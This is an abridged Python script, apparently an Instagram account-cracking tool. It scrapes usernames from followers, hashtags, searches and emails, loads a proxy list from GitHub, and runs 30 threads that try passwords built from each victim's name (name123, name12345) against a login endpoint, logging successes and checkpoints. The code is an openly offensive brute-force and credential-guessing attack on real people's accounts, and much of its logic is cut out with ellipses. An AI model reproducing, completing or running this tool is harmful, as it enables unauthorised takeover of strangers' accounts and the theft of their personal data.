...
def ___menu___():
    try:
        ...
        exit(f"{P}[{K}!{P}]{K} Connection Error")
    print(f"{K}[{M}1{K}]{B} Dump Username From {H}Following")
    print(f"{K}[{M}2{K}]{B} Dump Username From {M}Followers")
    print(f"{K}[{M}3{K}]{B} Dump Username From {M}Activity")
    print(f"{K}[{M}4{K}]{B} Dump Username From {M}Home")
    print(f"{K}[{M}5{K}]{B} Dump Username From {M}Hashtag")
    print(f"{K}[{M}6{K}]{B} Dump Username From {M}Search")
    print(f"{K}[{M}7{K}]{B} Dump Username From {M}Query")
    print(f"{K}[{M}8{K}]{B} Dump User {M}From Email")
    print(f"{K}[{M}9{K}]{K} Start Crack {P}[{H}Fast{P}]{H}")
    print(f"{K}[{M}0{K}]{H} List Total Crack")
    print(f"{K}[{M}A{K}]{H} Log out {P}[{M}Exit{P}]{M}\n")
...
def ___proxy___():
    try:
        ...
        ___roz = requests.get('https://github.com/MN4WN1-777/ignew/blob/master/Data/proxy2.txt').text
        open('Data/proxy.txt', 'w').write(___roz)
    ___crack___()
# Crack
class ___crack___:
    ...
    def __init__(self):
        ...
        self.ok = []
        self.cp = []
        print(f"\n{K}[{M}1{K}]{P} Enter Password {B}[{H}Username, Username123{B}]{K}")
        print(f"\n{K}[{M}2{K}]{P} Enter Password {B}[{H}Name, Name123, Name12345{B}]{K}")
        print(f"{K}[{M}3{K}]{P} Enter Password {B}[{H}name, name123, name1234, name12345{B}]{K}")
        print(f"{K}[{M}4{K}]{P} Enter Password {B}[{M}name, name123, name1234, name12345, name321{B}]{K}")
        print(f"{K}[{M}5{K}]{H} Enter Password Manual {H}[{M}>6{H}]{K}\n")
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                for ___user in self.___file:
                    ...
                    z = nama.split(' ')
                    if ___pilih in ['1','01']:
                       password = [username.replace(' ',''), username, z[0]+'123']
                    elif ___pilih in ['2','02']:
            ...
            for pw in pwx:
                ...
                with requests.Session() as ses:
                    ...
                    if 'userId' in str(response):
                        ...
                        print(f"\r{B}[{P}✔{B}]{P} Status :{H} MN4WN Success     ")
                        ...
                        print(f"\r{B}[{P}✘{B}]{P} Status :{K} MN4WN Checkpoint    ")
